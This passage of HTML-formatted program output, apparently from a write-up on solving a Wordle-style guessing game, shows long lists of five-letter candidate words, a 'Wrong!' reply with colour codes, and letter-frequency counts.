class="string">&#x27;flaps&#x27;</span>, <span class="string">&#x27;bucks&#x27;</span>, <span class="string">&#x27;aides&#x27;</span>, <span class="string">&#x27;racks&#x27;</span>, <span class="string">&#x27;necks&#x27;</span>, <span class="string">&#x27;colds&#x27;</span>, <span class="string">&#x27;casas&#x27;</span>, <span class="string">&#x27;winks&#x27;</span>, <span class="string">&#x27;boars&#x27;</span>, <span class="string">&#x27;dines&#x27;</span>, <span class="string">&#x27;wails&#x27;</span>, <span class="string">&#x27;aloes&#x27;</span>, <span class="string">&#x27;bancs&#x27;</span>, <span class="string">&#x27;rears&#x27;</span>, <span class="string">&#x27;epics&#x27;</span>, <span class="string">&#x27;colts&#x27;</span>, <span class="string">&#x27;drays&#x27;</span>, <span class="string">&#x27;clods&#x27;</span>, <span class="string">&#x27;gents&#x27;</span>, <span class="string">&#x27;chins&#x27;</span>, <span class="string">&#x27;knobs&#x27;</span>, <span class="string">&#x27;butts&#x27;</span>, <span class="string">&#x27;wasps&#x27;</span>, <span class="string">&#x27;limes&#x27;</span>, <span class="string">&#x27;slays&#x27;</span>, <span class="string">&#x27;dikes&#x27;</span>, <span class="string">&#x27;peeps&#x27;</span>, <span class="string">&#x27;studs&#x27;</span>, <span class="string">&#x27;bouts&#x27;</span>, <span class="string">&#x27;jokes&#x27;</span>, <span class="string">&#x27;heros&#x27;</span>, <span class="string">&#x27;hoods&#x27;</span>, <span class="string">&#x27;flaws&#x27;</span>, <span class="string">&#x27;moles&#x27;</span>, <span class="string">&#x27;slits&#x27;</span>, <span class="string">&#x27;muses&#x27;</span>, <span class="string">&#x27;meads&#x27;</span>, <span class="string">&#x27;poses&#x27;</span>, <span class="string">&#x27;gnats&#x27;</span>, <span class="string">&#x27;stags&#x27;</span>, <span class="string">&#x27;clams&#x27;</span>, <span class="string">&#x27;satis&#x27;</span>, <span class="string">&#x27;tetes&#x27;</span>, <span class="string">&#x27;bunks&#x27;</span>, <span class="string">&#x27;seers&#x27;</span>, <span class="string">&#x27;corks&#x27;</span>, <span class="string">&#x27;tarts&#x27;</span>, <span class="string">&#x27;floes&#x27;</span>, <span class="string">&#x27;siens&#x27;</span>, <span class="string">&#x27;blots&#x27;</span>, <span class="string">&#x27;cubes&#x27;</span>, <span class="string">&#x27;stabs&#x27;</span>, <span class="string">&#x27;pinks&#x27;</span>, <span class="string">&#x27;spans&#x27;</span>, <span class="string">&#x27;liens&#x27;</span>, <span class="string">&#x27;reals&#x27;</span>, <span class="string">&#x27;wipes&#x27;</span>, <span class="string">&#x27;fords&#x27;</span>, <span class="string">&#x27;claps&#x27;</span>, <span class="string">&#x27;amies&#x27;</span>, <span class="string">&#x27;vexes&#x27;</span>, <span class="string">&#x27;roues&#x27;</span>, <span class="string">&#x27;tacks&#x27;</span>, <span class="string">&#x27;bogus&#x27;</span>, <span class="string">&#x27;rives&#x27;</span>, <span class="string">&#x27;lobes&#x27;</span>, <span class="string">&#x27;teens&#x27;</span>, <span class="string">&#x27;mixes&#x27;</span>, <span class="string">&#x27;dales&#x27;</span>, <span class="string">&#x27;heirs&#x27;</span>, <span class="string">&#x27;wisps&#x27;</span>, <span class="string">&#x27;penis&#x27;</span>, <span class="string">&#x27;tombs&#x27;</span>, <span class="string">&#x27;tress&#x27;</span>, <span class="string">&#x27;wires&#x27;</span>, <span class="string">&#x27;heals&#x27;</span>, <span class="string">&#x27;atlas&#x27;</span>, <span class="string">&#x27;rakes&#x27;</span>, <span class="string">&#x27;shins&#x27;</span>, <span class="string">&#x27;vials&#x27;</span>, <span class="string">&#x27;fiefs&#x27;</span>, <span class="string">&#x27;spins&#x27;</span>, <span class="string">&#x27;auras&#x27;</span>, <span class="string">&#x27;pomps&#x27;</span>, <span class="string">&#x27;jails&#x27;</span>, <span class="string">&#x27;dells&#x27;</span>, <span class="string">&#x27;modus&#x27;</span>, <span class="string">&#x27;shams&#x27;</span>, <span class="string">&#x27;pests&#x27;</span>, <span class="string">&#x27;betes&#x27;</span>, <span class="string">&#x27;shuns&#x27;</span>, <span class="string">&#x27;nests&#x27;</span>, <span class="string">&#x27;bergs&#x27;</span>, <span class="string">&#x27;sucks&#x27;</span>, <span class="string">&#x27;dives&#x27;</span>, <span class="string">&#x27;herbs&#x27;</span>, <span class="string">&#x27;roles&#x27;</span>, <span class="string">&#x27;chats&#x27;</span>, <span class="string">&#x27;cools&#x27;</span>, <span class="string">&#x27;snaps&#x27;</span>, <span class="string">&#x27;hives&#x27;</span>, <span class="string">&#x27;ovens&#x27;</span>, <span class="string">&#x27;toits&#x27;</span>, <span class="string">&#x27;pales&#x27;</span>, <span class="string">&#x27;trans&#x27;</span>, <span class="string">&#x27;clues&#x27;</span>, <span class="string">&#x27;yawns&#x27;</span>, <span class="string">&#x27;frets&#x27;</span>, <span class="string">&#x27;lures&#x27;</span>, <span class="string">&#x27;trots&#x27;</span>, <span class="string">&#x27;hairs&#x27;</span>, <span class="string">&#x27;sleds&#x27;</span>, <span class="string">&#x27;banns&#x27;</span>, <span class="string">&#x27;tares&#x27;</span>, <span class="string">&#x27;flits&#x27;</span>, <span class="string">&#x27;discs&#x27;</span>, <span class="string">&#x27;grins&#x27;</span>, <span class="string">&#x27;flees&#x27;</span>, <span class="string">&#x27;gibes&#x27;</span>, <span class="string">&#x27;manus&#x27;</span>, <span class="string">&#x27;booms&#x27;</span>, <span class="string">&#x27;grubs&#x27;</span>, <span class="string">&#x27;fells&#x27;</span>, <span class="string">&#x27;verts&#x27;</span>, <span class="string">&#x27;vests&#x27;</span>, <span class="string">&#x27;hulks&#x27;</span>, <span class="string">&#x27;rudes&#x27;</span>, <span class="string">&#x27;menus&#x27;</span>, <span class="string">&#x27;clogs&#x27;</span>, <span class="string">&#x27;arras&#x27;</span>, <span class="string">&#x27;exits&#x27;</span>, <span class="string">&#x27;hails&#x27;</span>, <span class="string">&#x27;gilds&#x27;</span>, <span class="string">&#x27;coves&#x27;</span>, <span class="string">&#x27;junks&#x27;</span>, <span class="string">&#x27;draps&#x27;</span>, <span class="string">&#x27;torts&#x27;</span>, <span class="string">&#x27;fuels&#x27;</span>, <span class="string">&#x27;licks&#x27;</span>, <span class="string">&#x27;bumps&#x27;</span>, <span class="string">&#x27;hurls&#x27;</span>, <span class="string">&#x27;harms&#x27;</span>, <span class="string">&#x27;meses&#x27;</span>, <span class="string">&#x27;solos&#x27;</span>, <span class="string">&#x27;glans&#x27;</span>, <span class="string">&#x27;boons&#x27;</span>, <span class="string">&#x27;slugs&#x27;</span>, <span class="string">&#x27;heeds&#x27;</span>, <span class="string">&#x27;stews&#x27;</span>, <span class="string">&#x27;cults&#x27;</span>, <span class="string">&#x27;frees&#x27;</span>, <span class="string">&#x27;hulls&#x27;</span>, <span class="string">&#x27;baits&#x27;</span>, <span class="string">&#x27;marts&#x27;</span>, <span class="string">&#x27;rifts&#x27;</span>, <span class="string">&#x27;doers&#x27;</span>, <span class="string">&#x27;foils&#x27;</span>, <span class="string">&#x27;leaks&#x27;</span>, <span class="string">&#x27;paras&#x27;</span>, <span class="string">&#x27;finis&#x27;</span>, <span class="string">&#x27;damps&#x27;</span>, <span class="string">&#x27;molds&#x27;</span>, <span class="string">&#x27;lapis&#x27;</span>, <span class="string">&#x27;hacks&#x27;</span>, <span class="string">&#x27;mises&#x27;</span>, <span class="string">&#x27;ambos&#x27;</span>, <span class="string">&#x27;mutes&#x27;</span>, <span class="string">&#x27;brats&#x27;</span>, <span class="string">&#x27;wands&#x27;</span>, <span class="string">&#x27;fuses&#x27;</span>, <span class="string">&#x27;gants&#x27;</span>, <span class="string">&#x27;loups&#x27;</span>, <span class="string">&#x27;curds&#x27;</span>, <span class="string">&#x27;gongs&#x27;</span>, <span class="string">&#x27;fides&#x27;</span>, <span class="string">&#x27;tomes&#x27;</span>, <span class="string">&#x27;waifs&#x27;</span>, <span class="string">&#x27;grams&#x27;</span>, <span class="string">&#x27;ponts&#x27;</span>, <span class="string">&#x27;drums&#x27;</span>, <span class="string">&#x27;plies&#x27;</span>, <span class="string">&#x27;slaps&#x27;</span>, <span class="string">&#x27;lames&#x27;</span>, <span class="string">&#x27;mites&#x27;</span>, <span class="string">&#x27;pawns&#x27;</span>, <span class="string">&#x27;lulls&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>, <span class="string">&#x27;emits&#x27;</span>, <span class="string">&#x27;duets&#x27;</span>, <span class="string">&#x27;avers&#x27;</span>, <span class="string">&#x27;corns&#x27;</span>, <span class="string">&#x27;tills&#x27;</span>, <span class="string">&#x27;boors&#x27;</span>, <span class="string">&#x27;hells&#x27;</span>, <span class="string">&#x27;axles&#x27;</span>, <span class="string">&#x27;laves&#x27;</span>, <span class="string">&#x27;raves&#x27;</span>, <span class="string">&#x27;talus&#x27;</span>, <span class="string">&#x27;clefs&#x27;</span>, <span class="string">&#x27;fawns&#x27;</span>, <span class="string">&#x27;yokes&#x27;</span>, <span class="string">&#x27;prows&#x27;</span>, <span class="string">&#x27;jupes&#x27;</span>, <span class="string">&#x27;hides&#x27;</span>, <span class="string">&#x27;galls&#x27;</span>, <span class="string">&#x27;fiers&#x27;</span>, <span class="string">&#x27;skips&#x27;</span>, <span class="string">&#x27;mores&#x27;</span>, <span class="string">&#x27;drams&#x27;</span>, <span class="string">&#x27;knits&#x27;</span>, <span class="string">&#x27;synes&#x27;</span>, <span class="string">&#x27;peons&#x27;</span>, <span class="string">&#x27;waxes&#x27;</span>, <span class="string">&#x27;roams&#x27;</span>, <span class="string">&#x27;sabes&#x27;</span>, <span class="string">&#x27;slats&#x27;</span>, <span class="string">&#x27;buoys&#x27;</span>, <span class="string">&#x27;reaps&#x27;</span>, <span class="string">&#x27;ruses&#x27;</span>, <span class="string">&#x27;oases&#x27;</span>, <span class="string">&#x27;plugs&#x27;</span>, <span class="string">&#x27;ticks&#x27;</span>, <span class="string">&#x27;dames&#x27;</span>, <span class="string">&#x27;warts&#x27;</span>, <span class="string">&#x27;miens&#x27;</span>, <span class="string">&#x27;reeks&#x27;</span>, <span class="string">&#x27;motes&#x27;</span>, <span class="string">&#x27;sixes&#x27;</span>, <span class="string">&#x27;clays&#x27;</span>, <span class="string">&#x27;teems&#x27;</span>, <span class="string">&#x27;casus&#x27;</span>, <span class="string">&#x27;cores&#x27;</span>, <span class="string">&#x27;runes&#x27;</span>, <span class="string">&#x27;lutes&#x27;</span>, <span class="string">&#x27;meres&#x27;</span>, <span class="string">&#x27;quips&#x27;</span>, <span class="string">&#x27;blocs&#x27;</span>, <span class="string">&#x27;preys&#x27;</span>, <span class="string">&#x27;slops&#x27;</span>, <span class="string">&#x27;quais&#x27;</span>, <span class="string">&#x27;altos&#x27;</span>, <span class="string">&#x27;leeks&#x27;</span>, <span class="string">&#x27;dooms&#x27;</span>, <span class="string">&#x27;hires&#x27;</span>, <span class="string">&#x27;solus&#x27;</span>, <span class="string">&#x27;fifes&#x27;</span>, <span class="string">&#x27;gules&#x27;</span>, <span class="string">&#x27;maces&#x27;</span>, <span class="string">&#x27;thews&#x27;</span>, <span class="string">&#x27;sagas&#x27;</span>, <span class="string">&#x27;scans&#x27;</span>, <span class="string">&#x27;devas&#x27;</span>, <span class="string">&#x27;ovals&#x27;</span>, <span class="string">&#x27;pures&#x27;</span>, <span class="string">&#x27;lairs&#x27;</span>, <span class="string">&#x27;gnaws&#x27;</span>, <span class="string">&#x27;peres&#x27;</span>, <span class="string">&#x27;snags&#x27;</span>, <span class="string">&#x27;keels&#x27;</span>, <span class="string">&#x27;grays&#x27;</span>, <span class="string">&#x27;slags&#x27;</span>, <span class="string">&#x27;pelts&#x27;</span>, <span class="string">&#x27;plows&#x27;</span>, <span class="string">&#x27;grabs&#x27;</span>, <span class="string">&#x27;helms&#x27;</span>, <span class="string">&#x27;gouts&#x27;</span>, <span class="string">&#x27;bides&#x27;</span>, <span class="string">&#x27;jacks&#x27;</span>, <span class="string">&#x27;piles&#x27;</span>, <span class="string">&#x27;almas&#x27;</span>, <span class="string">&#x27;barbs&#x27;</span>, <span class="string">&#x27;brigs&#x27;</span>, <span class="string">&#x27;nears&#x27;</span>, <span class="string">&#x27;flues&#x27;</span>, <span class="string">&#x27;wafts&#x27;</span>, <span class="string">&#x27;pecks&#x27;</span>, <span class="string">&#x27;avows&#x27;</span>, <span class="string">&#x27;trams&#x27;</span>, <span class="string">&#x27;varas&#x27;</span>, <span class="string">&#x27;hinds&#x27;</span>, <span class="string">&#x27;laths&#x27;</span>, <span class="string">&#x27;welks&#x27;</span>, <span class="string">&#x27;snobs&#x27;</span>, <span class="string">&#x27;dotes&#x27;</span>, <span class="string">&#x27;taels&#x27;</span>, <span class="string">&#x27;mends&#x27;</span>, <span class="string">&#x27;fives&#x27;</span>, <span class="string">&#x27;rungs&#x27;</span>, <span class="string">&#x27;rimes&#x27;</span>, <span class="string">&#x27;aegis&#x27;</span>, <span class="string">&#x27;routs&#x27;</span>, <span class="string">&#x27;gages&#x27;</span>, <span class="string">&#x27;pates&#x27;</span>, <span class="string">&#x27;ducts&#x27;</span>, <span class="string">&#x27;ricks&#x27;</span>, <span class="string">&#x27;diets&#x27;</span>, <span class="string">&#x27;lavas&#x27;</span>, <span class="string">&#x27;boles&#x27;</span>, <span class="string">&#x27;mesas&#x27;</span>, <span class="string">&#x27;locis&#x27;</span>, <span class="string">&#x27;aeons&#x27;</span>, <span class="string">&#x27;reams&#x27;</span>, <span class="string">&#x27;fanes&#x27;</span>, <span class="string">&#x27;fauns&#x27;</span>, <span class="string">&#x27;tapes&#x27;</span>, <span class="string">&#x27;bangs&#x27;</span>, <span class="string">&#x27;bodes&#x27;</span>, <span class="string">&#x27;drips&#x27;</span>, <span class="string">&#x27;wicks&#x27;</span>, <span class="string">&#x27;polis&#x27;</span>, <span class="string">&#x27;dures&#x27;</span>, <span class="string">&#x27;foams&#x27;</span>, <span class="string">&#x27;loges&#x27;</span>, <span class="string">&#x27;seres&#x27;</span>, <span class="string">&#x27;harts&#x27;</span>, <span class="string">&#x27;clous&#x27;</span>, <span class="string">&#x27;whigs&#x27;</span>, <span class="string">&#x27;brags&#x27;</span>, <span class="string">&#x27;cribs&#x27;</span>, <span class="string">&#x27;yelps&#x27;</span>, <span class="string">&#x27;sulks&#x27;</span>, <span class="string">&#x27;etats&#x27;</span>, <span class="string">&#x27;dimes&#x27;</span>, <span class="string">&#x27;tilts&#x27;</span>, <span class="string">&#x27;moats&#x27;</span>, <span class="string">&#x27;sills&#x27;</span>, <span class="string">&#x27;pedis&#x27;</span>, <span class="string">&#x27;pokes&#x27;</span>, <span class="string">&#x27;ruffs&#x27;</span>, <span class="string">&#x27;braes&#x27;</span>, <span class="string">&#x27;mumps&#x27;</span>, <span class="string">&#x27;dices&#x27;</span>, <span class="string">&#x27;greys&#x27;</span>, <span class="string">&#x27;duros&#x27;</span>, <span class="string">&#x27;wanes&#x27;</span>, <span class="string">&#x27;humps&#x27;</span>, <span class="string">&#x27;hilts&#x27;</span>, <span class="string">&#x27;sinds&#x27;</span>, <span class="string">&#x27;deans&#x27;</span>, <span class="string">&#x27;hauls&#x27;</span>, <span class="string">&#x27;mints&#x27;</span>, <span class="string">&#x27;naves&#x27;</span>, <span class="string">&#x27;leges&#x27;</span>, <span class="string">&#x27;mimes&#x27;</span>, <span class="string">&#x27;opals&#x27;</span>, <span class="string">&#x27;jeans&#x27;</span>, <span class="string">&#x27;daubs&#x27;</span>, <span class="string">&#x27;gears&#x27;</span>, <span class="string">&#x27;hoots&#x27;</span>, <span class="string">&#x27;loons&#x27;</span>, <span class="string">&#x27;rides&#x27;</span>, <span class="string">&#x27;annas&#x27;</span>, <span class="string">&#x27;burrs&#x27;</span>, <span class="string">&#x27;clips&#x27;</span>, <span class="string">&#x27;vanes&#x27;</span>, <span class="string">&#x27;goads&#x27;</span>, <span class="string">&#x27;skims&#x27;</span>, <span class="string">&#x27;brims&#x27;</span>, <span class="string">&#x27;bulks&#x27;</span>, <span class="string">&#x27;oozes&#x27;</span>, <span class="string">&#x27;tiges&#x27;</span>, <span class="string">&#x27;volts&#x27;</span>, <span class="string">&#x27;pelas&#x27;</span>, <span class="string">&#x27;papas&#x27;</span>, <span class="string">&#x27;gapes&#x27;</span>, <span class="string">&#x27;autos&#x27;</span>, <span class="string">&#x27;eases&#x27;</span>, <span class="string">&#x27;girds&#x27;</span>, <span class="string">&#x27;pries&#x27;</span>, <span class="string">&#x27;vires&#x27;</span>, <span class="string">&#x27;plebs&#x27;</span>, <span class="string">&#x27;clews&#x27;</span>, <span class="string">&#x27;leves&#x27;</span>, <span class="string">&#x27;gaols&#x27;</span>, <span class="string">&#x27;minas&#x27;</span>, <span class="string">&#x27;whens&#x27;</span>, <span class="string">&#x27;malis&#x27;</span>]</span><br><span class="line">sagas</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">3527</span></span><br><span class="line">白色 <span class="number">2889</span></span><br><span class="line">白色 <span class="number">2815</span></span><br><span class="line">白色 <span class="number">2665</span></span><br><span class="line">白色 <span class="number">1959</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;c1&#x27;</span>, <span class="number">193</span>), (<span class="string">&#x27;a3&#x27;</span>, <span class="number">268</span>), (<span class="string">&#x27;o2&#x27;</span>, <span class="number">359</span>), (<span class="string">&#x27;e4&#x27;</span>, <span class="number">367</span>), (<span class="string">&#x27;e5&#x27;</span>, <span class="number">430</span>)]</span><br><span class="line">[<span class="string">&#x27;awake&#x27;</span>, <span class="string">&#x27;evade&#x27;</span>, <span class="string">&#x27;grade&#x27;</span>, <span class="string">&#x27;abate&#x27;</span>, <span class="string">&#x27;abase&#x27;</span>, <span class="string">&#x27;pride&#x27;</span>, <span class="string">&#x27;adobe&#x27;</span>, <span class="string">&#x27;crate&#x27;</span>, <span class="string">&#x27;bribe&#x27;</span>, <span class="string">&#x27;flume&#x27;</span>, <span class="string">&#x27;agree&#x27;</span>, <span class="string">&#x27;biome&#x27;</span>, <span class="string">&#x27;forge&#x27;</span>, <span class="string">&#x27;agate&#x27;</span>, <span class="string">&#x27;alone&#x27;</span>, <span class="string">&#x27;erode&#x27;</span>, <span class="string">&#x27;gouge&#x27;</span>, <span class="string">&#x27;rouge&#x27;</span>, <span class="string">&#x27;wrote&#x27;</span>, <span class="string">&#x27;tilde&#x27;</span>, <span class="string">&#x27;prove&#x27;</span>, <span class="string">&#x27;grime&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;brake&#x27;</span>, <span class="string">&#x27;craze&#x27;</span>, <span class="string">&#x27;gripe&#x27;</span>, <span class="string">&#x27;acute&#x27;</span>, <span class="string">&#x27;aside&#x27;</span>, <span class="string">&#x27;gorge&#x27;</span>, <span class="string">&#x27;wince&#x27;</span>, <span class="string">&#x27;those&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;dodge&#x27;</span>, <span class="string">&#x27;trove&#x27;</span>, <span class="string">&#x27;bloke&#x27;</span>, <span class="string">&#x27;choke&#x27;</span>, <span class="string">&#x27;rupee&#x27;</span>, <span class="string">&#x27;brine&#x27;</span>, <span class="string">&#x27;tease&#x27;</span>, <span class="string">&#x27;movie&#x27;</span>, <span class="string">&#x27;purge&#x27;</span>, <span class="string">&#x27;trope&#x27;</span>, <span class="string">&#x27;fibre&#x27;</span>, <span class="string">&#x27;mince&#x27;</span>, <span class="string">&#x27;ample&#x27;</span>, <span class="string">&#x27;oxide&#x27;</span>, <span class="string">&#x27;olive&#x27;</span>, <span class="string">&#x27;delve&#x27;</span>, <span class="string">&#x27;hinge&#x27;</span>, <span class="string">&#x27;phase&#x27;</span>, <span class="string">&#x27;goose&#x27;</span>, <span class="string">&#x27;atone&#x27;</span>, <span class="string">&#x27;agape&#x27;</span>, <span class="string">&#x27;voice&#x27;</span>, <span class="string">&#x27;wedge&#x27;</span>, <span class="string">&#x27;trite&#x27;</span>, <span class="string">&#x27;midge&#x27;</span>, <span class="string">&#x27;elope&#x27;</span>, <span class="string">&#x27;rhyme&#x27;</span>, <span class="string">&#x27;twice&#x27;</span>, <span class="string">&#x27;prize&#x27;</span>, <span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;booze&#x27;</span>, <span class="string">&#x27;thyme&#x27;</span>, <span class="string">&#x27;chute&#x27;</span>, <span class="string">&#x27;trice&#x27;</span>, <span class="string">&#x27;alike&#x27;</span>, <span class="string">&#x27;liege&#x27;</span>, <span class="string">&#x27;grate&#x27;</span>, <span class="string">&#x27;leave&#x27;</span>, <span class="string">&#x27;twine&#x27;</span>, <span class="string">&#x27;grove&#x27;</span>, <span class="string">&#x27;ombre&#x27;</span>, <span class="string">&#x27;unite&#x27;</span>, <span class="string">&#x27;there&#x27;</span>, <span class="string">&#x27;louse&#x27;</span>, <span class="string">&#x27;grave&#x27;</span>, <span class="string">&#x27;inane&#x27;</span>, <span class="string">&#x27;crave&#x27;</span>, <span class="string">&#x27;pique&#x27;</span>, <span class="string">&#x27;arise&#x27;</span>, <span class="string">&#x27;genre&#x27;</span>, <span class="string">&#x27;plume&#x27;</span>, <span class="string">&#x27;rifle&#x27;</span>, <span class="string">&#x27;undue&#x27;</span>, <span class="string">&#x27;guile&#x27;</span>, <span class="string">&#x27;melee&#x27;</span>, <span class="string">&#x27;loose&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;eerie&#x27;</span>, <span class="string">&#x27;price&#x27;</span>, <span class="string">&#x27;chose&#x27;</span>, <span class="string">&#x27;niece&#x27;</span>, <span class="string">&#x27;grace&#x27;</span>, <span class="string">&#x27;diode&#x27;</span>, <span class="string">&#x27;chase&#x27;</span>, <span class="string">&#x27;prone&#x27;</span>, <span class="string">&#x27;evoke&#x27;</span>, <span class="string">&#x27;elite&#x27;</span>, <span class="string">&#x27;purse&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;awoke&#x27;</span>, <span class="string">&#x27;exile&#x27;</span>, <span class="string">&#x27;nurse&#x27;</span>, <span class="string">&#x27;house&#x27;</span>, <span class="string">&#x27;elude&#x27;</span>, <span class="string">&#x27;cycle&#x27;</span>, <span class="string">&#x27;boule&#x27;</span>, <span class="string">&#x27;place&#x27;</span>, <span class="string">&#x27;nerve&#x27;</span>, <span class="string">&#x27;ridge&#x27;</span>, <span class="string">&#x27;gnome&#x27;</span>, <span class="string">&#x27;prose&#x27;</span>, <span class="string">&#x27;budge&#x27;</span>, <span class="string">&#x27;ozone&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;truce&#x27;</span>, <span class="string">&#x27;verse&#x27;</span>, <span class="string">&#x27;verve&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;cutie&#x27;</span>, <span class="string">&#x27;azure&#x27;</span>, <span class="string">&#x27;weave&#x27;</span>, <span class="string">&#x27;genie&#x27;</span>, <span class="string">&#x27;glove&#x27;</span>, <span class="string">&#x27;irate&#x27;</span>, <span class="string">&#x27;amaze&#x27;</span>, <span class="string">&#x27;globe&#x27;</span>, <span class="string">&#x27;rouse&#x27;</span>, <span class="string">&#x27;alive&#x27;</span>, <span class="string">&#x27;ensue&#x27;</span>, <span class="string">&#x27;anime&#x27;</span>, <span class="string">&#x27;dunce&#x27;</span>, <span class="string">&#x27;bilge&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;noose&#x27;</span>, <span class="string">&#x27;prime&#x27;</span>, <span class="string">&#x27;nudge&#x27;</span>, <span class="string">&#x27;brave&#x27;</span>, <span class="string">&#x27;amble&#x27;</span>, <span class="string">&#x27;amuse&#x27;</span>, <span class="string">&#x27;copse&#x27;</span>, <span class="string">&#x27;knife&#x27;</span>, <span class="string">&#x27;plane&#x27;</span>, <span class="string">&#x27;abide&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;graze&#x27;</span>, <span class="string">&#x27;utile&#x27;</span>, <span class="string">&#x27;adage&#x27;</span>, <span class="string">&#x27;trade&#x27;</span>, <span class="string">&#x27;clove&#x27;</span>, <span class="string">&#x27;emcee&#x27;</span>, <span class="string">&#x27;adore&#x27;</span>, <span class="string">&#x27;puree&#x27;</span>, <span class="string">&#x27;venue&#x27;</span>, <span class="string">&#x27;pixie&#x27;</span>, <span class="string">&#x27;penne&#x27;</span>, <span class="string">&#x27;lodge&#x27;</span>, <span class="string">&#x27;glide&#x27;</span>, <span class="string">&#x27;usage&#x27;</span>, <span class="string">&#x27;poise&#x27;</span>, <span class="string">&#x27;drove&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;aware&#x27;</span>, <span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;chore&#x27;</span>, <span class="string">&#x27;fluke&#x27;</span>, <span class="string">&#x27;dense&#x27;</span>, <span class="string">&#x27;lunge&#x27;</span>, <span class="string">&#x27;plate&#x27;</span>, <span class="string">&#x27;bible&#x27;</span>, <span class="string">&#x27;agile&#x27;</span>, <span class="string">&#x27;knave&#x27;</span>, <span class="string">&#x27;arose&#x27;</span>, <span class="string">&#x27;glare&#x27;</span>, <span class="string">&#x27;grope&#x27;</span>, <span class="string">&#x27;uncle&#x27;</span>, <span class="string">&#x27;dirge&#x27;</span>, <span class="string">&#x27;horde&#x27;</span>, <span class="string">&#x27;quite&#x27;</span>, <span class="string">&#x27;chafe&#x27;</span>, <span class="string">&#x27;elide&#x27;</span>, <span class="string">&#x27;pence&#x27;</span>, <span class="string">&#x27;blaze&#x27;</span>, <span class="string">&#x27;posse&#x27;</span>, <span class="string">&#x27;mouse&#x27;</span>, <span class="string">&#x27;creme&#x27;</span>, <span class="string">&#x27;merge&#x27;</span>, <span class="string">&#x27;tense&#x27;</span>, <span class="string">&#x27;route&#x27;</span>, <span class="string">&#x27;issue&#x27;</span>, <span class="string">&#x27;urine&#x27;</span>, <span class="string">&#x27;flute&#x27;</span>, <span class="string">&#x27;obese&#x27;</span>, <span class="string">&#x27;whale&#x27;</span>, <span class="string">&#x27;abuse&#x27;</span>, <span class="string">&#x27;terse&#x27;</span>, <span class="string">&#x27;drake&#x27;</span>, <span class="string">&#x27;afire&#x27;</span>, <span class="string">&#x27;tithe&#x27;</span>, <span class="string">&#x27;noble&#x27;</span>, <span class="string">&#x27;bride&#x27;</span>, <span class="string">&#x27;these&#x27;</span>, <span class="string">&#x27;erase&#x27;</span>, <span class="string">&#x27;quake&#x27;</span>, <span class="string">&#x27;prude&#x27;</span>, <span class="string">&#x27;femme&#x27;</span>, <span class="string">&#x27;glade&#x27;</span>, <span class="string">&#x27;elate&#x27;</span>, <span class="string">&#x27;whole&#x27;</span>, <span class="string">&#x27;ovate&#x27;</span>, <span class="string">&#x27;lease&#x27;</span>, <span class="string">&#x27;blare&#x27;</span>, <span class="string">&#x27;probe&#x27;</span>, <span class="string">&#x27;crepe&#x27;</span>, <span class="string">&#x27;force&#x27;</span>, <span class="string">&#x27;abode&#x27;</span>, <span class="string">&#x27;aisle&#x27;</span>, <span class="string">&#x27;verge&#x27;</span>, <span class="string">&#x27;guide&#x27;</span>, <span class="string">&#x27;revue&#x27;</span>, <span class="string">&#x27;tulle&#x27;</span>, <span class="string">&#x27;crude&#x27;</span>, <span class="string">&#x27;curse&#x27;</span>, <span class="string">&#x27;opine&#x27;</span>, <span class="string">&#x27;crane&#x27;</span>, <span class="string">&#x27;lithe&#x27;</span>, <span class="string">&#x27;prune&#x27;</span>, <span class="string">&#x27;chide&#x27;</span>, <span class="string">&#x27;ankle&#x27;</span>, <span class="string">&#x27;tribe&#x27;</span>, <span class="string">&#x27;cease&#x27;</span>, <span class="string">&#x27;flame&#x27;</span>, <span class="string">&#x27;broke&#x27;</span>, <span class="string">&#x27;bulge&#x27;</span>, <span class="string">&#x27;butte&#x27;</span>, <span class="string">&#x27;tripe&#x27;</span>, <span class="string">&#x27;worse&#x27;</span>, <span class="string">&#x27;phone&#x27;</span>, <span class="string">&#x27;binge&#x27;</span>, <span class="string">&#x27;belie&#x27;</span>, <span class="string">&#x27;above&#x27;</span>, <span class="string">&#x27;fence&#x27;</span>, <span class="string">&#x27;ounce&#x27;</span>, <span class="string">&#x27;flake&#x27;</span>, <span class="string">&#x27;anode&#x27;</span>, <span class="string">&#x27;crime&#x27;</span>, <span class="string">&#x27;imbue&#x27;</span>, <span class="string">&#x27;ledge&#x27;</span>, <span class="string">&#x27;drone&#x27;</span>, <span class="string">&#x27;niche&#x27;</span>, <span class="string">&#x27;juice&#x27;</span>, <span class="string">&#x27;brute&#x27;</span>, <span class="string">&#x27;reuse&#x27;</span>, <span class="string">&#x27;quote&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>, <span class="string">&#x27;flare&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;etude&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;belle&#x27;</span>, <span class="string">&#x27;ovine&#x27;</span>, <span class="string">&#x27;heave&#x27;</span>, <span class="string">&#x27;borne&#x27;</span>, <span class="string">&#x27;rinse&#x27;</span>, <span class="string">&#x27;deuce&#x27;</span>, <span class="string">&#x27;hedge&#x27;</span>, <span class="string">&#x27;coupe&#x27;</span>, <span class="string">&#x27;blade&#x27;</span>, <span class="string">&#x27;geese&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;clone&#x27;</span>, <span class="string">&#x27;guise&#x27;</span>, <span class="string">&#x27;drape&#x27;</span>, <span class="string">&#x27;glaze&#x27;</span>, <span 